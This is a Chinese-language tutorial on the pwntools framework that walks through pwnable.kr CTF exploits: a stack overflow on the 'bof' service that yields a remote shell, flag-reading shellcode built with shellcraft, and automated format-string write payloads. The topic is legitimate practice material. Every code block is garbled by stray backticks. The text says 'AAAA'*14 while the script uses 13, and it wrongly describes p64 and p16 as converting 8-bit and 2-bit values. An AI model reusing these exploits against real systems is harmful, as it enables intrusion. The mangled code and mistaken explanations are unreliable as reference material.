# PWNTOOLS的使用

**pwntools**是一个二进制利用框架。官方文档提供了详细的**api**规范。由于本文只是用来介绍**pwntools**使用方法，不会过于详细的讲解各种二进制漏洞攻击技术。

## Pwntools的“Hello World”

栈溢出无疑是二进制攻击的“Hello World”。这里，我们用pwnable.kr的bof来进行展示。

```
`#include <stdio.h>``#include <string.h>``#include <stdlib.h>``void func(``int` `key){``    ``char overflowme[``32``];``    ``printf(``"overflow me : "``);``    ``gets(overflowme);    ``/``/` `smash me!``    ``if``(key ``=``=` `0xcafebabe``){``        ``system(``"/bin/sh"``);``    ``}``    ``else``{``        ``printf(``"Nah..\n"``);``    ``}``}``int` `main(``int` `argc, char``*` `argv[]){``    ``func(``0xdeadbeef``);``    ``return` `0``;``}`
```

pwntools脚本：

```
`from` `pwn ``import` `*``c ``=` `remote(``"pwnable.kr"``, ``9000``) ``c.sendline(``"AAAA"` `*` `13` `+` `p32(``0xcafebabe``))``c.interactive()`
```

源码简洁明了，我们只需要将**key**改写成`0xcafebabe`。

现在我们重新看回pwntools脚本。第一行将pwntools提供的工具引入到我们的python上下文中。

`remote("一个域名或者ip地址", 端口)` 会连接到我们指定的地址及端口。 然后该函数会返回remote对象 (这里，我们将该对象保存到了变量 `c`). remote对象主要用来进行对远程主机的输入输出. 它有如下几个方法：

- `send(payload)` 发送payload
- `sendline(payload)` 发送payload，并进行换行（末尾**\n**）
- `sendafter(some_string, payload)` 接收到 some_string 后, 发送你的 payload
- `recvn(N)` 接受 N(数字) 字符
- `recvline()` 接收一行输出
- `recvlines(N)` 接收 N(数字) 行输出
- `recvuntil(some_string)` 接收到 some_string 为止

在第三行中, `p32()` 可以让我们转换整数到小端序格式. `p32` 转换4字节. `p64` 和 `p16` 则分别转换 8 bit 和 2 bit 数字. `c.sendline` 将我们的payload发送到远程主机. `"AAAA" * 14` 是我们到**key**的偏移量. Pwntools 不能自动运算偏移量，用户需要自行计算。

最后，我们成功getshell了. 这时，你可能想发送命令进行交互. `c.interactive()` 允许我们在终端里将命令传送到远程服务器. Pwntools 会自动接收输出并回显 .

![图片描述](https://bbs.pediy.com/upload/attach/201901/3_3KDCPDBYDBFWSMH.png)

## 写 Shellcode

下一题是pwnable.kr的asm. 你需要用 `ssh -p2222 asm@pwnable.kr` 并输入密码 `guest` 来查看可执行文件和源码. 这里，我们只展示利用代码：

```
`from` `pwn ``import` `*` `p ``=` `process(``"./asm"``)``context.log_level ``=` `'DEBUG'``gdb.attach(p)` `context(arch``=``'amd64'``, os``=``'linux'``)` `shellcode ``=` `shellcraft.amd64.pushstr(``"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"``)``shellcode ``+``=` `shellcraft.amd64.linux.``open``(``'rsp'``,``0``,``0``)``shellcode ``+``=` `shellcraft.amd64.linux.read(``'rax'``,``'rsp'``,``0``)``shellcode ``+``=` `shellcraft.amd64.linux.write(``1``, ``'rsp'``, ``100``)` `p.recvuntil(``'shellcode: '``)``p.send(asm(shellcode))``log.success(p.recvall())`
```

我们这里用到了新的api: `process()`, `contex.log_level`, `gdb.attach`, 和 `shellcraft`.
`process` 和 `remote` 累死.  `remote` 连接远程主机, `process` 则通过你声明的二进制文件路径在本地创建新的进程. 除了 I/O, `process` 返回的对象可以通过 `gdb.attach(p)` 将进程attach到gdb上. Attach 之后,  gdb 便可以调试该程序来 (设置 breakpoints, 查看 stack, 以及简单的反汇编).

![图片描述](https://bbs.pediy.com/upload/attach/201901/3_QGGWTB3XTZ6JTC5.png)

> 提醒一下，如果你想在命令行中使用gdb.attach(), 便需要安装并运行 tmux. [更多关于tmux的信息](https://hackernoon.com/a-gentle-introduction-to-tmux-8d784c404340).

当我们想查看服务器输出时，并不需要在每个 `recvline` 或者 `recvuntil` 前加 `print`. 当 `context.log_level` 被设置为 `"DEBUG"` , 我们的输入和服务器的输出会被直接输出.

`shellcraft` 是一个帮忙生成shellcode的类. 在我们的例子中, 我们 *open* 了一个文件并 *read* 文件到 *stdout*. 关于这个类更多的文档, 你可以查阅 [官方文档](http://docs.pwntools.com/en/stable/shellcraft.html).

## 格式化漏洞自动化

我没有找到一个比较容易做的格式化漏洞题目，所以干脆用了官方文档的例子：

```
`from` `pwn ``import` `*``import` `tempfile` `program ``=` `tempfile.mktemp()``source  ``=` `program ``+` `".c"``write(source, ``'''``#include <stdio.h>``#include <stdlib.h>``#include <unistd.h>``#include <sys/mman.h>``#define MEMORY_ADDRESS ((void*)0x11111000)``#define MEMORY_SIZE 1024``#define TARGET ((int *) 0x11111110)``int main(int argc, char const *argv[])``{``       ``char buff[1024];``       ``void *ptr = NULL;``       ``int *my_var = TARGET;``       ``ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);``       ``if(ptr != MEMORY_ADDRESS)``       ``{``               ``perror("mmap");``               ``return EXIT_FAILURE;``       ``}``       ``*my_var = 0x41414141;``       ``write(1, &my_var, sizeof(int *));``       ``scanf("%s", buff);``       ``dprintf(2, buff);``       ``write(1, my_var, sizeof(int));``       ``return 0;``}'''``)``cmdline ``=` `[``"gcc"``, source, ``"-Wno-format-security"``, ``"-m32"``, ``"-o"``, program]``process(cmdline).wait_for_close()``def` `exec_fmt(payload):``    ``p ``=` `process(program)``    ``p.sendline(payload)``    ``return` `p.recvall()` `autofmt ``=` `FmtStr(exec_fmt)``offset ``=` `autofmt.offset``p ``=` `process(program, stderr``=``PIPE)``addr ``=` `u32(p.recv(``4``))``payload ``=` `fmtstr_payload(offset, {addr: ``0x1337babe``})``p.sendline(payload)``print` `hex``(unpack(p.recv(``4``)))`
```

有了 `FmtStr`, 我们不用算偏移量算到疯. 我们需要先构造一个可以接收我们输入并返回格式化字符串输出的函数. 接着，我们可以得到 `autofmt`. 这个对象包含 `offset`, 即算好的偏移量. `fmtstr_payload(offset, {address: value})` 帮我们生成最后的payload. 第一个参数 `offset` 用 `autofmt.offset` 算好的即可. 然后, 我们需要声明 `{address: value}` 来覆盖address的内容成对应的value. 我们还可以同时改写多个地址: `{address1: value1, address2:value2,..., address: valueN}`.

有些情况不能自动生成payload. 以下文档介绍了如何手动生成payload [fmtstr_payload](http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload).

## 使用 ELF()

有些题目给了我们libc. 用 `gdb> x function1 — function2` 算偏移量太麻烦了, 因此有了 `ELF`.

```
`from` `pwn ``import` `*` `e ``=` `ELF(``'./example_file'``)``print` `hex``(e.address)  ``# 0x400000``print` `hex``(e.symbols[``'write'``]) ``# 0x401680``print` `hex``(e.got[``'write'``]) ``# 0x60b070``print` `hex``(e.plt[``'write'``]) ``# 0x401680``offset ``=` `e.symbols[``'system'``] ``-` `e.symbols[``'printf'``] ``# calculate offset``binsh_address ``=` `next``(e.search(``'/bin/sh\x00'``)) ``# find address which contains /bin/sh`
```

和 `process()` 一样, 我们只用将路径给 `ELF(path)` 即可分析 ELF.

我们有以下几种方法操纵ELF:

- `symbols['a_function']` 找到 `a_function` 的地址
- `got['a_function']` 找到 `a_function`的 got 
- `plt['a_function']` 找到 `a_function` 的 plt
- `next(e.search("some_characters"))` 找到包含 `some_characters`（字符串，汇编代码或者某个数值）的地址. 

## 总结

Pwntools 是一套十分强大的工具. 在本文中, 我介绍了最常用的几个api, 但 pwntools 还有很多其他强大的api，诸如 qemu, adb. 各位可通过官方文档进行剩余的学习